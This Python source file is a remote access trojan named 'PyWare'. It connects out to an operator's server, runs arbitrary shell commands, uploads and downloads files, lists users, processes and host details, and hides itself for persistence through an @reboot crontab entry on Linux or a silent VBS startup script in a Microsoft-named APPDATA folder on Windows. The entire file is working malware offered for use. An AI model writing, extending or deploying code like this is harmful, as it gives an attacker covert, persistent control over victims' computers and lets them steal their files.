#!/usr/bin/python3
# -*-coding:Utf-8 -*-

import os
import sys
import platform
import locale
import time
import random
import base64
import socket
import configparser
import subprocess

try:
    import crypto
    from Crypto.Hash import SHA256
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False

CONFIG_FILE = ""                   # Config file to use. If it doesn't exist, following value are used.
HOST = "localhost"                 # Ip or domain name of the server
PORT = 4444                        # Port de connection au server
RETRY_INTERVAL = 3600              # Reconnection interval in case of failure, in seconds
BUFFER_SIZE = 4096

OS = sys.platform


class Configuration:
    def __init__(self, host: str, port: int, retry_interval: int):
        self.__index = 0
        self.filename = self.config_file()
        self.config = configparser.ConfigParser()
        self.host = host
        self.port = port
        self.retry_interval = retry_interval

    @staticmethod
    def config_file():
        global CONFIG_FILE
        if CONFIG_FILE == "":
            filename = __file__[:-2] + "cfg"
        else:
            filename = os.getcwd() + CONFIG_FILE
        return filename

    def next(self):
        if os.path.isfile(self.filename):
            self.config.read(self.filename)
            servers = self.config.sections()

            # Read DEFAULT section
            try:
                self.read(self.config["DEFAULT"])
            except KeyError:  # DEFAULT section have been deleted
                pass

            # Read personal sections and overwrites the correct values
            if self.__index + 1 > len(servers) > 1:
                # List finished. Reload first if more than one server
                self.__index = 0
            if len(servers) != 0:
                # personal server data set
                self.read(self.config[servers[self.__index]])
                self.__index += 1

    def read(self, server: configparser.SectionProxy):
        if server["Host"]:
            self.host = server["Host"]
        if server["Port"]:
            try:
                port_read = int(server["Port"])
                if 1 <= port_read <= 65535:
                    self.port = port_read
            except ValueError:
                pass
        if server["RetryInterval"]:
            try:
                retry_interval_read = int(server["RetryInterval"])
                if retry_interval_read >= 0:
                    self.retry_interval = retry_interval_read
            except ValueError:
                pass


class ConnectionClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.settimeout(3600.0)
        self.is_alive = False
        if CRYPTO_OK:
            self.session_key = crypto.CryptoAES()  # Key and iv are generate
        else:
            self.session_key = None

    # TODO RAPPORT
    # Process a new connection to the server.
    # Return 0 if connection established
    # Return a positive value if the server refused the connection
    # Return a negative value if it is not possible to resolve the nameserver
    def new_connection_out(self):
        try:
            self.client_socket.connect((self.host, self.port))
            self.is_alive = True
            self.keys_exchange()
            exit_value = 0
        except (ConnectionRefusedError, TimeoutError, OSError):
            # TODO RAPPORT : OSError si pas de connection
            self.is_alive = False
            exit_value = 1
        except socket.gaierror:
            # TODO hote non joignable, changer d'hote
            #  socket.gaierror si host indisponible
            #  NOTE PERSO : fait mais a tester
            self.is_alive = False
            exit_value = -1
        return exit_value

    def keys_exchange(self):
        try:
            global CRYPTO_OK
            global BUFFER_SIZE
            pub_key_b64 = self.client_socket.recv(BUFFER_SIZE)
            pub_key = base64.b64decode(pub_key_b64)
            if CRYPTO_OK:
                rsa_enc = crypto.CryptoRSA(pub_key)
                key_iv = self.session_key.key + b" " + self.session_key.iv
                key_iv_enc = rsa_enc.encrypt(key_iv)
            else:
                key_iv_enc = base64.b64encode(b"Unvailable00")
            self.client_socket.sendall(key_iv_enc)
        except (ConnectionAbortedError, ConnectionResetError, socket.timeout):
            self.is_alive = False

    def send_enc(self, data):
        global CRYPTO_OK
        global BUFFER_SIZE
        if type(data) == str:
            data = data.encode("utf-8", errors="replace")
        if CRYPTO_OK:
            data_enc = self.session_key.encrypt(data)
        else:
            data_enc = base64.b64encode(data)
        try:
            if len(data_enc) % BUFFER_SIZE == 0:
                data_enc += b" " * 5
            self.client_socket.sendall(data_enc)
        except (ConnectionAbortedError, ConnectionResetError):
            self.is_alive = False

    def receive_enc(self):
        global CRYPTO_OK
        global BUFFER_SIZE
        try:
            data_enc = b""
            while len(data_enc) % 4096 == 0:
                data_enc += self.client_socket.recv(BUFFER_SIZE)
            if data_enc[-5:] == b" " * 5:
                data_enc = data_enc[:-5]
            if CRYPTO_OK:
                data = self.session_key.decrypt(data_enc)
            else:
                data = base64.b64decode(data_enc)
        except (ConnectionAbortedError, ConnectionResetError, socket.timeout):
            data = b""
            self.is_alive = False
        return data

    def end(self):
        self.client_socket.close()
        self.is_alive = False


class Commands:
    def __init__(self, connection: ConnectionClient):
        self.connection = connection
        self.commands_available = {"exit": lambda: self.exit(),
                                   "kill": lambda: self.kill(),
                                   "getinfo": lambda arg="": self.getinfo(arg),
                                   "autostart": lambda arg="": self.autostart(arg),
                                   "newkeys": lambda: self.newkeys(),
                                   "exec": lambda arg="": self.exec(arg),
                                   "getusers": lambda: self.getusers(),
                                   "installmodules": lambda: self.install_module(),
                                   "reload": lambda: self.reload(),
                                   "getservices": lambda: self.getservices(),
                                   "pwd": lambda: self.pwd(),
                                   "cd": lambda arg="": self.cd(arg),
                                   "ls": lambda arg="": self.ls(arg),
                                   "upload": lambda arg="": self.upload(arg),
                                   "download": lambda arg="": self.download(arg)}

    def run(self):
        user_input = self.connection.receive_enc().decode("utf-8", errors="replace").split()
        try:
            user_command = user_input[0].lower()
            user_arguments = " ".join(user_input[1:])
            try:
                if user_arguments == "":
                    self.commands_available[user_command]()
                else:
                    self.commands_available[user_command](user_arguments)
            except TypeError:
                self.connection.send_enc(" ERROR SERVER : This command don't have arguments.\n"
                                         "  Type help for list available commands.")
            except KeyError:
                self.connection.send_enc(" ERROR SERVER : Command \'{}\' not found.\n"
                                         "  Type help for list available commands.".format(user_command))
        except IndexError:
            pass

    @staticmethod
    def system_command(command=""):
        ret = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        ret_string = ret.stdout.read()
        ret_string_errors = ret.stderr.read()
        if ret_string_errors != b"":
            ret_string += b"\n" + command.encode("utf-8") + b"\n" + ret_string_errors
        return ret_string.decode("utf-8", errors="replace")

    def exit(self):
        global RETRY_INTERVAL
        self.connection.send_enc("Connection close. New connection in {} seconds.".format(RETRY_INTERVAL))
        self.connection.end()

    def kill(self):
        global KILL
        self.connection.send_enc("PyWare on target kill.")
        self.connection.end()
        KILL = True

    def getinfo(self, choice=""):
        choice_list = choice.lower().replace(",", " ").split()
        info_string = ""
        platform_info = platform.uname()
        send_info = False
        if ("user" in choice_list or "username" in choice_list) or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("User", os.getlogin())
            send_info = True
        if ("hostname" in choice_list or "host" in choice_list) or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("Hostname", platform_info.node)
            send_info = True
        if "fqdn" in choice_list or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("Fqdn", socket.getfqdn())
            send_info = True
        if "ip" in choice_list or len(choice_list) == 0:
            ip = "; ".join(socket.gethostbyname_ex(socket.gethostname())[2])
            info_string += "{:15} : {}\n".format("Ip", ip)
            send_info = True
        if "os" in choice_list or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("Os", platform_info.system + " " + platform_info.release)
            send_info = True
        if ("version" in choice_list or "ver" in choice_list) or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("Version", platform_info.version)
            send_info = True
        if ("architecture" in choice_list or "archi" in choice_list) or len(choice_list) == 0:
            info_string += "{:15} : {}\n".format("Architecture", platform_info.machine)
            send_info = True
        if ("language" in choice_list or "lang" in choice_list) or len(choice_list) == 0:
            language_list = []
            if locale.getlocale()[0] is not None:
                language_list.append(locale.getlocale()[0])
            if locale.getdefaultlocale()[0] is not None:
                language_list.append(locale.getdefaultlocale()[0])
            info_string += "{:15} : {}\n".format("Language", "; ".join(language_list))
            send_info = True
        if "time" in choice_list or len(choice_list) == 0:
            localtime = time.localtime()
            time_info = "{d}/{mon}/{y} {h}:{min}:{s}".format(d=localtime.tm_mday, mon=localtime.tm_mon,
                                                             y=localtime.tm_year, h=localtime.tm_hour,
                                                             min=localtime.tm_min, s=localtime.tm_sec)
            info_string += "{:15} : {}\n".format("Time", time_info)
            send_info = True
        if not send_info:
            info_string = "ERROR SERVER : getinfo {} not available".format(choice)
        self.connection.send_enc(info_string)

    def newkeys(self):
        if CRYPTO_OK:
            self.connection.session_key = crypto.CryptoAES()  # New key and iv are generate
            self.connection.keys_exchange()
            self.connection.send_enc("Keys changed")
        else:
            self.connection.keys_exchange()
            self.connection.send_enc("ERROR SERVER : Client does not support encryption.\n    Base64 will be used.")

    def exec(self, command: str):
        ret = self.system_command(command)
        self.connection.send_enc(ret)

    def getusers(self):
        global OS
        if OS == "linux":
            users = self.system_command("cat /etc/passwd | cut -d : -f 1,3")
            while users[-1:] == "\n" or users[-1:] == " ":
                users = users[:-1]
            users_list = users.split("\n")
            string = "{user:15} : {sid}\n".format(user="USERS", sid="SID")
            string += "{user:15} : {sid}\n".format(user="-"*15, sid="-"*7)
            for user in users_list:
                try:
                    user_name = user.split(":")[0]
                except IndexError:
                    user_name = ""
                try:
                    user_sid = user.split(":")[1]
                except IndexError:
                    user_sid = ""
                string += "{user:15} : {sid}\n".format(user=user_name, sid=user_sid)
        elif OS == "win32":
            string = self.system_command("net user")
        else:
            string = "Sorry, {} is not support by this module".format(OS)
        self.connection.send_enc(string)

    def install_module(self):
        os_name = os.name
        if os_name == "posix":
            self.exec("pip install pycryptodome")
            string = "installed module"
        elif os_name == "nt":
            self.exec("python -m pip install pycryptodome")
            string = "installed module"
        else:
            string = "Sorry. {} not supported for this module".format(os_name)
        self.connection.send_enc(string)

    def reload(self):  # TODO not working
        global OS
        global KILL
        if OS == "linux":
            self.connection.send_enc("INFO SERVER : reloading")
            self.connection.end()
            time.sleep(5)
            subprocess.run(["python3", __file__])
            KILL = True
        elif OS == "win32":
            self.connection.send_enc("INFO SERVER : reloading")
            self.connection.end()
            time.sleep(5)
            subprocess.run(["python", __file__])
            KILL = True
        else:
            self.connection.send_enc("Sorry, {} is not support by this module".format(OS))

    def getservices(self):
        global OS
        if OS == "linux":
            services = self.system_command("ps -aux")
        elif OS == "win32":
            services = self.system_command("tasklist")
        else:
            services = "Sorry, {} is not support by this module".format(OS)
        self.connection.send_enc(services)

    def autostart(self, name: str):
        def sys_copy(command: str, origin_file: str, destination_location: str):
            if os.path.exists(origin_file):
                if not os.path.exists(destination_location + origin_file.split("/")[-1]):
                    ret = "Copy of {} :\n".format(origin_file)
                    ret += self.system_command("{} \"{}\" \"{}\"".format(command, origin_file, destination_location))
                else:
                    ret = "{} already exist".format(destination_location)
            else:
                ret = "{} not found.".format(origin_file)
            return ret

        global OS
        if OS == "linux":
            if name == "":
                name = ".services"
            string = ""
            # Copy the files to a permanent location
            permanent_location = "/home/" + os.getlogin() + "/" + name
            string += " copy of PyWare in {} \n".format(permanent_location)
            if not os.path.exists(permanent_location):
                string += "Creation of directory {}\n".format(permanent_location)
                string += self.system_command("mkdir {}".format(permanent_location.replace(" ", "\\ "))) + "\n"
            else:
                string += "directory already exist " + permanent_location
            string += sys_copy("cp -v", __file__, permanent_location + "/") + "\n"
            string += sys_copy("cp -v", Configuration.config_file(), permanent_location + "/") + "\n"
            string += sys_copy("cp -v", "crypto.py", permanent_location + "/") + "\n"
            # Add line in the crontab
            string += "Add line in the crontab\n"
            temp_filename = "/tmp/" + str(random.random())[2:] + ".tmp"
            while os.path.exists(temp_filename):
                temp_filename = "/tmp/" + str(random.random())[2:] + ".tmp"
            string += self.system_command("crontab -l -u {user} > {file} 2> /dev/null".format(
                                          user=os.getlogin(), file=temp_filename))
            try:
                temp_file = open(temp_filename, "at")
                temp_file.write("@reboot\tpython3 \"{}\"\n".format(permanent_location + "/" + __file__.split("/")[-1]))
                temp_file.close()
                string += self.system_command("crontab -u {user} - < {file}".format(
                                              user=os.getlogin(), file=temp_filename))
                string += "New crontab :\n" + self.system_command("crontab -l")
            except PermissionError:
                string += "Unable to write in /tmp/\n" \
                          "Creation of autostart cancelled but permanents files are not delete."

        elif OS == "win32":
            if name == "":
                name = "services"
            appdata = os.environ["APPDATA"]
            string = ""
            # Copy the files to a permanent location
            permanent_location = "{}\\Microsoft\\Windows\\{}".format(appdata, name[0].upper() + name[1:])
            string += " copy of PyWare in {} \n".format(permanent_location)
            if not os.path.exists(permanent_location):
                string += "Creation of directory " + permanent_location
                string += self.system_command("mkdir \"{}\"".format(permanent_location)) + "\n"
            else:
                string += "directory already exist " + permanent_location
            string += sys_copy("copy", __file__, permanent_location + "\\") + "\n"
            string += sys_copy("copy", Configuration.config_file(), permanent_location + "\\") + "\n"
            string += sys_copy("copy", "crypto.py", permanent_location + "\\") + "\n"
            # Create link for autostart
            autostart_location = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.vbs".format(name)
            string += autostart_location + "\n"
            if not os.path.exists(autostart_location):
                autostart_file = open(autostart_location, "wt")
                autostart_file.write("CreateObject(\"Wscript.Shell\").Run \"python \"\"{}\"\"\",0,True".format(
                    permanent_location + "\\" + __file__[:-3].split("/")[-1] + ".py"))
                autostart_file.close()
                string += "Automatic start file create"
            else:
                string += "Automatic start file seems to already exist"
        else:
            string = "Sorry, {} is not support by this module".format(OS)
        self.connection.send_enc(string)

    def pwd(self):
        self.connection.send_enc(os.getcwd())

    def cd(self, dir: str):
        if not os.path.exists(dir):
            string = "Directory {} not found".format(dir)
        elif not os.path.isdir(dir):
            string = "{} is not a directory".format(dir)
        else:
            try:
                os.chdir(dir)
                string = os.getcwd()
            except FileNotFoundError:
                string = "Unknown error"
        self.connection.send_enc(string)

    def ls(self, dir="."):
        if dir == "":
            dir = "."
        if not os.path.exists(dir):
            string = "Directory \'{}\' not found".format(dir)
        elif not os.path.isdir(dir):
            string = "{} is not a directory".format(dir)
        else:
            try:
                ret = os.listdir(dir)
                string = "\n".join(ret)
            except FileNotFoundError:
                string = "Unknown error"
        self.connection.send_enc(string)

    def upload(self, filename=""):
        global CRYPTO_OK
        if filename == "":
            self.connection.send_enc("SERVER ERROR : Please, specify a file")
        elif not os.path.exists(filename):
            self.connection.send_enc("SERVER ERROR : File {} not found".format(filename))
        elif not os.path.isfile(filename):
            self.connection.send_enc("SERVER ERROR : {} is not a file.".format(filename))
        else:
            try:
                file = open(filename, "rb")
                self.connection.send_enc(b"ok")
                data = file.read()
                self.connection.send_enc(data)
                self.connection.receive_enc()  # Waiting to receive an ack
                if CRYPTO_OK:
                    file.seek(0)
                    hash = SHA256.new(data=file.read()).hexdigest()
                    self.connection.send_enc(hash)
                file.close()
            except PermissionError:
                self.connection.send_enc("SERVER ERROR : Permission denied."
                                         " Please, verify the permissions of the file.")

    def download(self, filename):
        global CRYPTO_OK
        if filename == "":
            self.connection.send_enc("ERROR SERVER : Please, specify a file")
        elif os.path.exists(filename):
            self.connection.send_enc("ERROR SERVER : File {} already exist on distant computer".format(filename))
        else:
            try:
                file = open(filename, "wb+")
                self.connection.send_enc(b"ok")
                data_in = self.connection.receive_enc()
                file.write(data_in)
                self.connection.send_enc("SERVER INFO : Download finish")
                if CRYPTO_OK:
                    file.seek(0)
                    hash = SHA256.new(data=file.read()).hexdigest().encode("utf-8")
                    self.connection.send_enc(hash)
                else:
                    self.connection.send_enc("SERVER INFO : Unable to check the hash. Cryptography is disable.")
                file.close()
            except PermissionError:
                self.connection.send_enc("ERROR SERVER : Unable to create file. Please, verify permissions")


def main():
    global KILL
    config_server = Configuration(HOST, PORT, RETRY_INTERVAL)
    config_server.next()
    KILL = False
    while not KILL:
        client_connection = ConnectionClient(config_server.host, config_server.port)
        ret = client_connection.new_connection_out()
        while ret != 0:
            if ret < 0:
                config_server.next()
            time.sleep(10)  # TODO config_server.retry_interval)
            ret = client_connection.new_connection_out()
        server_command = Commands(client_connection)
        while client_connection.is_alive:
            server_command.run()
        print("connection lost")  # TODO delete line


KILL = False
if __name__ == "__main__":
    main()